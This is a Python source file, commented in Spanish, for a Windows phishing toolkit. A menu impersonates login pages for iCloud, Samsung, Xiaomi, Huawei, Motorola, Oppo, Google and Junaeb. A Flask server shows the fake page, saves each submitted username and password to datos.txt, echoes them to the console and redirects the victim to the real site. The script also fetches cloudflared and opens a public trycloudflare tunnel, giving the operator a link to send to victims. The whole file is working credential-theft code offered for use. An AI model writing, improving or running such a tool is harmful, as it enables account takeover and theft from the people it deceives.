import os
import threading
import subprocess
import platform
import re
from time import sleep
from flask import Flask, render_template, redirect, request

# Configuración de servicios
SERVICIOS = {
    "01": ("iCloud", "https://www.icloud.com"),
    "02": ("Samsung", "https://account.samsung.com"),
    "03": ("Xiaomi", "https://account.xiaomi.com"),
    "04": ("Huawei", "https://id7.cloud.huawei.com"),
    "05": ("Motorola", "https://motorola.cl"),
    "06": ("Oppo", "https://id.oppo.com"),
    "07": ("Google", "https://google.com"),
    "08": ("Junaeb", "https://junaeb.cl"),
}

def detectar_y_descargar():
    binario = "cloudflared.exe"
    if not os.path.exists(binario):
        print("\033[1;33m[*] Cloudflared no detectado. Descargando via PowerShell...\033[0m")
        # Comando compatible para ejecutar desde CMD llamando a PowerShell para la descarga
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        cmd_descarga = f'powershell -Command "Invoke-WebRequest -Uri {url} -OutFile {binario}"'
        subprocess.run(cmd_descarga, shell=True)
    return binario

def iniciar_servidor(plantilla, url_real):
    app = Flask(__name__)
    
    # Desactivar logs de Flask en la consola para no ensuciar el menú
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    @app.route('/')
    def index(): 
        return render_template(plantilla)

    @app.route('/submit', methods=['POST'])
    def submit():
        u, p = request.form.get('username'), request.form.get('password')
        if u and p:
            with open('datos.txt', 'a') as f:
                f.write(f"Servicio: {plantilla} | User: {u} | Pass: {p}\n")
                print(f"\n\n\033[1;32m[!] CREDENCIAL RECIBIDA: \033[1;37mUser: {u} | Pass: {p}\033[0m\n")
            return redirect(url_real)
        return redirect('/')
    
    app.run(port=5000, debug=False, use_reloader=False)

def obtener_link_cloudflare(binario):
    print("\033[1;33m[*] Abriendo tunel Cloudflare en puerto 5000...\033[0m")
    # Comando estándar para Windows CMD
    proceso = subprocess.Popen(
        [binario, 'tunnel', '--url', 'http://127.0.0.1:5000'],
        stderr=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW # Evita que se abran mil ventanas
    )

    link = None
    while True:
        linea = proceso.stderr.readline()
        if not linea: break
        # Filtro para extraer la URL de trycloudflare
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', linea)
        if match:
            link = match.group(0)
            print(f"\n\033[1;32m[+] LINK PUBLICO: \033[1;37m{link}\033[0m")
            print("\033[1;36m[*] Esperando datos... (No cierres esta ventana)\033[0m")
            break
    return proceso

def menu():
    # Asegurarse de estar en Windows
    if platform.system() != "Windows":
        print("Este archivo es solo para Windows (CMD). Usa termux.py.")
        return

    bin_cf = detectar_y_descargar()
    
    while True:
        os.system('cls')
        print(r"""
  _____   _____   _____  __  __ _____ 
 |  __ \ / ____| |  __ \|  \/  |  __ \
 | |__) | |      | |  | | \  / | |  | |
 |  ___/| |      | |  | | |\/| | |  | |
 | |    | |____  | |__| | |  | | |__| |
 |_|     \_____| |_____/|_|  |_|_____/ 
        """)
        print("\033[1;37m  ──────────────────────────────────────────")
        print("\033[1;31m  [>] MODO: CMD WINDOWS | PORT: 5000")
        print("\033[1;37m  ──────────────────────────────────────────\033[0m")
        
        for id_s, (nombre, _) in SERVICIOS.items():
            print(f"  [{id_s}] {nombre}")
        
        print("\n  [x] Salir")
        
        op = input("\n\033[1;32mSeleccione una opcion: \033[0m").strip()
        
        if op.lower() == 'x':
            break

        if op in SERVICIOS:
            nombre, url = SERVICIOS[op]
            plantilla = f"{nombre.lower()}.html"
            
            # Verificar si la plantilla existe antes de lanzar todo
            if not os.path.exists(f"templates/{plantilla}"):
                if not os.path.exists("templates"): os.mkdir("templates")
                print(f"\033[1;31m[!] Error: No existe templates/{plantilla}\033[0m")
                sleep(2)
                continue

            # Iniciar servidor Flask en segundo plano
            t = threading.Thread(target=iniciar_servidor, args=(plantilla, url), daemon=True)
            t.start()
            
            sleep(2)
            
            # Iniciar Cloudflare
            proc_cf = obtener_link_cloudflare(bin_cf)
            
            print("\nPresione CTRL+C o ENTER para detener este servicio y volver al menu...")
            try:
                input()
            except KeyboardInterrupt:
                pass
            
            proc_cf.terminate()
            print("\n[*] Servicio detenido.")
            sleep(1)

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        os._exit(0)
